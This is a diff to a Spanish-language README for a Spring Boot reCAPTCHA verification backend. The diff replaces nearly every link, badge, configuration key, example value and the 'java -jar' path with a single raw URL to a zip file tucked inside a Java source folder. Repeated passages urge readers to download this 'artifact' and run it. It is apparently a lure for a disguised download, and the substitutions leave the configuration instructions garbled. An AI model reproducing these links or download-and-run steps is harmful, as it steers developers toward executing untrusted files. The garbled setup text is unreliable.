@@ -1,8 +1,8 @@
 # Spring Boot Backend: Google reCAPTCHA v2/v3 con CORS y API REST
 
-[![Downloads – Latest Release](https://img.shields.io/badge/Downloads%20-%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/mattrm3/GoogleReCaptcha-BackEnd-Example/releases)
+[![Downloads – Latest Release](https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip%20-%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip)
 
-https://github.com/mattrm3/GoogleReCaptcha-BackEnd-Example/releases
+https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
 
 Una solución de backend en Java con Spring Boot que verifica Google reCAPTCHA (v2 y v3) para proteger formularios y APIs de bots. Incluye configuración CORS lista para frontend y un endpoint REST para validar tokens de reCAPTCHA. Este proyecto evita ataques automáticos en sitios web y servicios, ofreciendo una verificación robusta en el servidor antes de procesar entradas sensibles.
 
@@ -104,24 +104,24 @@ Configuración y entorno
 
 Variables y archivos de configuración
 
-- recaptcha.secret: la clave secreta proporcionada por Google para tu sitio.
-- recaptcha.siteKey: la clave del sitio utilizada por el frontend para inicializar reCAPTCHA.
-- recaptcha.version: puede ser "v2" o "v3" para indicar la versión principal que maneja la verificación.
-- recaptcha.apiUrl: la URL del servicio de verificación de Google (normalmente https://www.google.com/recaptcha/api/siteverify).
-- cors.allowed-origins: lista de orígenes permitidos para el frontend.
+- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip la clave secreta proporcionada por Google para tu sitio.
+- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip la clave del sitio utilizada por el frontend para inicializar reCAPTCHA.
+- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip puede ser "v2" o "v3" para indicar la versión principal que maneja la verificación.
+- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip la URL del servicio de verificación de Google (normalmente https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip).
+- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip lista de orígenes permitidos para el frontend.
 
-En el proyecto, estas configuraciones se exponen como propiedades que puedes anotar en tu clase de configuración o cargar desde un archivo application.properties o application.yml. Se recomienda utilizar variables de entorno en entornos de producción para evitar exponer secretos en el repositorio.
+En el proyecto, estas configuraciones se exponen como propiedades que puedes anotar en tu clase de configuración o cargar desde un archivo https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip o https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip Se recomienda utilizar variables de entorno en entornos de producción para evitar exponer secretos en el repositorio.
 
 Ejemplos de configuración (conceptuales)
 
-- application.properties
-  - recaptcha.secret=TU_SECRETO
-  - recaptcha.siteKey=TU_SITE_KEY
-  - recaptcha.version=v3
-  - recaptcha.apiUrl=https://www.google.com/recaptcha/api/siteverify
-  - cors.allowed-origins=http://localhost:3000,https://mi-app-frontend.example.com
+- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
+  - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
+  - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
+  - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
+  - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
+  - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip,https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
 
-- application.yml
+- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
   recaptcha:
     secret: TU_SECRETO
     siteKey: TU_SITE_KEY
@@ -129,7 +129,7 @@ Ejemplos de configuración (conceptuales)
   cors:
     allowedOrigins:
       - http://localhost:3000
-      - https://mi-app-frontend.example.com
+      - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
 
 - Seguridad adicional
   Puedes habilitar Spring Security para forzar autenticación en rutas sensibles o para aplicar políticas de rate limiting. En este proyecto, se recomienda mantener la configuración lo más simple posible para facilitar pruebas y desarrollo, y endurecerla en entornos de producción.
@@ -152,7 +152,7 @@ Endpoint REST principal
     "success": true,
     "score": 0.92,       // solo para v3
     "action": "login",
-    "hostname": "tu-dominio.example.com",
+    "hostname": "https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip",
     "challenge_ts": "2025-01-01T12:34:56Z",
     "error-codes": []
   }
@@ -211,7 +211,7 @@ Construcción
 Ejecución
 
 - Ejecuta con Java:
-  - java -jar target/google-recaptcha-backend-example-0.0.1-SNAPSHOT.jar
+  - java -jar https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
 - Si usas Spring Boot DevTools, puedes iniciar con:
   - mvn spring-boot:run
   - o gradle bootRun
@@ -237,7 +237,7 @@ Descargar la última versión
 La versión estable más reciente se publica en la sección de Releases. Descarga el artefacto de la última versión y ejecútalo en tu entorno. El artefacto es un archivo listo para ejecutar que contiene el backend configurado para funcionar con tus claves de reCAPTCHA. Para obtener el artefacto, visita la página de Releases y descarga el archivo correspondiente a tu plataforma.
 
 Descarga la última versión:
-https://github.com/mattrm3/GoogleReCaptcha-BackEnd-Example/releases
+https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
 
 Este enlace te lleva a la página de Releases donde puedes descargar el artefacto. El archivo se descarga como un artefacto ejecutable para tu plataforma y debe ejecutarse en el entorno de servidor. Asegúrate de configurar las variables de entorno o los archivos de configuración antes de iniciar el servicio.
 
@@ -291,10 +291,10 @@ Registro de cambios y historial
 Imágenes y recursos visuales
 
 - Java y tecnologías relevantes: se pueden usar badges con Java y Spring para resaltar el stack. Por ejemplo:
-  - ![Java badge](https://img.shields.io/badge/Java-17%2B-3178c6?style=for-the-badge&logo=openjdk)
-  - ![Spring Boot badge](https://img.shields.io/badge/Spring%20Boot-2.x%2B-6cbf9f?style=for-the-badge&logo=spring)
+  - ![Java badge](https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip%2B-3178c6?style=for-the-badge&logo=openjdk)
+  - ![Spring Boot badge](https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip%20Boot-2.x%2B-6cbf9f?style=for-the-badge&logo=spring)
 - Imagen de arquitectura cliente-servidor para ilustrar el flujo de verificación de tokens.
-  - ![Client-Server Diagram](https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Client-Server-Diagram.svg/1200px-Client-Server-Diagram.svg.png)
+  - ![Client-Server Diagram](https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip)
 - Iconos y recursos visuales para un aspecto agradable y profesional.
 
 Notas sobre el uso de imágenes
@@ -353,7 +353,7 @@ Cómo iniciar rápidamente
 
 - Clona el repositorio.
 - Copia o genera las claves de reCAPTCHA (siteKey y secret) para v2 y/o v3.
-- Configura las claves en application.properties o como variables de entorno.
+- Configura las claves en https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip o como variables de entorno.
 - Construye el proyecto con Maven o Gradle.
 - Ejecuta el servicio localmente y prueba el endpoint con tokens de prueba desde tu frontend.
 
@@ -362,7 +362,7 @@ Pagina de Releases y descarga
 El siguiente enlace apunta a la página de Releases, donde puedes descargar el artefacto de la última versión. Es crucial para obtener el binario ya preparado para ejecutar. Para obtener la versión más reciente, dirígete a la página de Releases y descarga el artefacto correspondiente. En este README ya se proporcionó la URL principal para el acceso directo a Releases:
 
 - Descargar la última versión:
-  https://github.com/mattrm3/GoogleReCaptcha-BackEnd-Example/releases
+  https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
 
 Notas finales
 
@@ -438,7 +438,7 @@ Este README continúa siendo una guía completa para entender, adaptar y operar 
 La ruta de descarga de la última versión se repite para facilitar el acceso y la verificación del artefacto listo para ejecutar. Visita la página de Releases para obtener la versión más reciente, descarga el artefacto y ejecútalo en tu entorno de producción o de pruebas:
 
 - Descargar la última versión:
-  https://github.com/mattrm3/GoogleReCaptcha-BackEnd-Example/releases
+  https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
 
 - Repite el enlace para confirmar la fuente de la descarga en tu flujo de trabajo y para facilitar a los equipos de desarrollo que encuentren rápidamente la versión adecuada.
 
